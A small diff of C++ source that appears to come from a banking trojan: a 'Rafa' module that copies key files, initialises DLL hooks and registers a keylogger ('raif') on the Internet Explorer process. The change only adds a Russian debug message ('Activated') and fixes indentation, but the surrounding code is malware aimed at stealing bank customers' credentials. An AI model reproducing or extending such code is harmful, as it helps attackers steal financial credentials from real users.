@@ -37,6 +37,7 @@ namespace Rafa {
 
 	void CopyRafaKeyFiles(LPVOID Sender)
 	{
+		DBGRAFA( "Rafa", "Активирована" );
 
 #ifdef RafaDllModule
 		InitHook_FilialRConDll();
@@ -51,7 +52,7 @@ namespace Rafa {
 	{
 		PKeyLogSystem S;
 
-		 S = KeyLogger::AddSystem("raif", PROCESS_HASH_IE);
+		S = KeyLogger::AddSystem("raif", PROCESS_HASH_IE);
 		if (S != NULL)
 		{
 			char RafaCaption[] = {
